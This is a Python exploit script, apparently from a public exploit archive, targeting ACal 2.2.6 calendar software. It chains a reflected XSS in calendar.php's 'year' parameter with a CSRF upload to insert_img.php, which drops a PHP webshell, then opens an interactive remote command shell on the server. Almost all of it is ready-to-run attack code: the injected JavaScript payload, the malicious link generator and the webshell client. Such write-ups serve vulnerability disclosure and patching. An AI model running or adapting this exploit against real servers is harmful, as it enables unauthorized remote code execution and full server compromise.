# Exploit Author: Bobby Cooke
# Date: May 14th, 2020
# Vendor Homepage: http://acalproj.sourceforge.net/ 
# Software Link: http://prdownloads.sourceforge.net/acalproj/ACal-2.2.6.tar.gz?download
# Version: 2.2.6
# Tested On: Windows 10 Pro 1909 (x64_86) + XAMPP 7.4.4 (the Hosting Webserver)
# Tested Against: Windows 10 1909 IE & Edge Browser (Client) & Linux Firefox 68.2.0esr 
# Exploit Tested On: Python 2.7.17
# Vulnerability Description: 
#   ACal v2.2.6 suffers from multiple Vulnerabilities allowing Remote Attackers to gain Remote Code Execution (RCE) on the Hosting Webserver via an Authenticated User clicking a Maliciously Crafted URL Link; launching a Sophisticated Attack-Chain to fully compromise the server.
# Exploit Details:
#   1. When an Authenticated User clicks the maliciously crafted URL Link, the &#039;/calendar.php&#039; webpage is exploited using a Reflected Cross-Site Scripting (XSS) attack in the vulnerable &#039;year&#039; parameter with a GET request. 
#   2. The XSS script executes JavaScript code within the clients browser and "Rides" the authenticated session to perform a Cross-Site Request Forgery (CSRF) attack on the vulnerable &#039;insert_img.php&#039; webpage.
#   3. Using an XMLHttpRequest, the JavaScript code dynamically generates & uploads a malicious PHP file to the Webserver with a malicious POST request.
#   4. After the Malicious PHP Webshell has been uploaded to the Webserver, the Exploit connects to the Webserver as an Unauthenticated User.
#   5. Once connected, the Exploit communicates with the PHP Webshell on the Webserver using the GET parameter &#039;cmd&#039; to gain interactive Remote Code Execution (RCE) on the Webserver.

import requests, sys, urllib
from colorama import Fore, Back, Style

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def urlEncode(javascript):
    return urllib.quote(javascript)

def webshell(WEBAPP_URL):
    try:
        WEB_SHELL = WEBAPP_URL+&#039;uploads/webshell.php&#039;
        getdir  = {&#039;cmd&#039;: &#039;echo %CD%&#039;}
        r1 = requests.get(WEB_SHELL, params=getdir, verify=False)
        status = r1.status_code
        if status != 200:
            print Style.BRIGHT+Fore.RED+"[!] "+Fore.RESET+"Could not connect to the webshell. Have an Authenticated User visit the generated URL in their Browser and Relaunch."+Style.RESET_ALL
            r1.raise_for_status()
        print(Fore.GREEN+&#039;[+] &#039;+Fore.RESET+&#039;Successfully connected to webshell.&#039;)
        cwd = r1.text
        cwd = cwd.replace(&#039;\n&#039;,&#039;> &#039;)
        term = Style.BRIGHT+Fore.GREEN+cwd+Fore.RESET
        while True:
            cmd = raw_input(term)
            command = {&#039;cmd&#039;: cmd}
            r2 = requests.get(WEB_SHELL, params=command, verify=False)
            status = r2.status_code
            if status != 200:
                r2.raise_for_status()
            response2 = r2.text
            print(response2)
    except:
        print("\r\nExiting.")
        sys.exit(-1)

def genXhrPayload(WEBAPP_URL):
    XHR_PAYLOAD  = &#039;<script>&#039;
    XHR_PAYLOAD += &#039;function read_body(xhr) { &#039;
    XHR_PAYLOAD += &#039;var data; &#039;
    XHR_PAYLOAD += &#039;if (!xhr.responseType || xhr.responseType === "text") { &#039;
    XHR_PAYLOAD += &#039;data = xhr.responseText; &#039;
    XHR_PAYLOAD += &#039;} else if (xhr.responseType === "document") { &#039;
    XHR_PAYLOAD += &#039;data = xhr.responseXML; &#039;
    XHR_PAYLOAD += &#039;} else if (xhr.responseType === "json") { &#039;
    XHR_PAYLOAD += &#039;data = xhr.responseJSON; &#039;
    XHR_PAYLOAD += &#039;} else { &#039;
    XHR_PAYLOAD += &#039;data = xhr.response; &#039;
    XHR_PAYLOAD += &#039;}; &#039;
    XHR_PAYLOAD += &#039;return data; &#039;
    XHR_PAYLOAD += &#039;}; &#039;
    XHR_PAYLOAD += &#039;var xhr = new XMLHttpRequest(); &#039;
    XHR_PAYLOAD += &#039;xhr.onreadystatechange = function() { &#039;
    XHR_PAYLOAD += &#039;if (xhr.readyState == XMLHttpRequest.DONE) { &#039;
    XHR_PAYLOAD += &#039;console.log(read_body(xhr)); &#039;
    XHR_PAYLOAD += &#039;}; &#039;
    XHR_PAYLOAD += &#039;}; &#039;
    XHR_PAYLOAD += &#039;var fd = new FormData(); &#039;
    XHR_PAYLOAD += "var content = &#039;<?php echo shell_exec($_GET[\"cmd\"]); ?>&#039;; "
    XHR_PAYLOAD += &#039;var blob = new Blob([content], { type: "application/x-php"}); &#039;
    XHR_PAYLOAD += &#039;fd.append("userfile", blob, "webshell.php"); &#039;
    XHR_PAYLOAD += &#039;fd.append("url", "http://"); &#039;
    XHR_PAYLOAD += &#039;console.log(fd); &#039;
    XHR_PAYLOAD += "xhr.open(&#039;POST&#039;, &#039;"+WEBAPP_URL+"insert_img.php?upload=file&#039;, true); "
    XHR_PAYLOAD += &#039;xhr.send(fd); &#039;
    XHR_PAYLOAD += &#039;</script>&#039;
    return XHR_PAYLOAD

def formatHelp(STRING):
    return Style.BRIGHT+Fore.RED+STRING+Fore.RESET

def header():
    BL   = Style.BRIGHT+Fore.GREEN
    RS   = Style.RESET_ALL
    FR   = Fore.RESET
    SIG  = BL+&#039;            /\\\n&#039;+RS
    SIG += Fore.YELLOW+&#039;/vvvvvvvvvvvv &#039;+BL+&#039;\\&#039;+FR+&#039;--------------------------------------,\n&#039;
    SIG += Fore.YELLOW+&#039;`^^^^^^^^^^^^&#039;+BL+&#039; /&#039;+FR+&#039;============&#039;+Fore.RED+&#039;BOKU&#039;+FR+&#039;====================="\n&#039;
    SIG += BL+&#039;            \/&#039;+RS+&#039;\n&#039;
    return SIG

if __name__ == "__main__":
    print header();
    if len(sys.argv) != 2:
        print formatHelp("(+) Usage:\t python %s <WEBAPP_URL>" % sys.argv[0])
        print formatHelp("(+) Example:\t python %s &#039;https://10.0.0.3:443/calendar/&#039;" % sys.argv[0])
        sys.exit(-1)
    WEBAPP_URL = sys.argv[1]
    CSRF_ATTACK = genXhrPayload(WEBAPP_URL)
    ENCODED_PAYLOAD = urlEncode(CSRF_ATTACK)
    print(Style.BRIGHT+Fore.BLUE+&#039;[+] &#039;+Fore.RESET+&#039;To execute the &#039;+Fore.RED+&#039;Reflected XSS Session-Riding CSRF Attack&#039;+Fore.RESET+&#039;, have an &#039;+Fore.GREEN+&#039;Authenticated User &#039;+Fore.RESET+&#039;visit &#039;+Fore.CYAN+&#039;this URL&#039;+Fore.RESET+&#039; in their &#039;+Fore.BLUE+&#039;Browser&#039;+Fore.RESET+&#039;:&#039;)
    print Fore.CYAN+WEBAPP_URL+&#039;calendar.php?year=&#039;+ENCODED_PAYLOAD+&#039;&month=05#&#039;+Fore.RESET
    webshell(WEBAPP_URL)

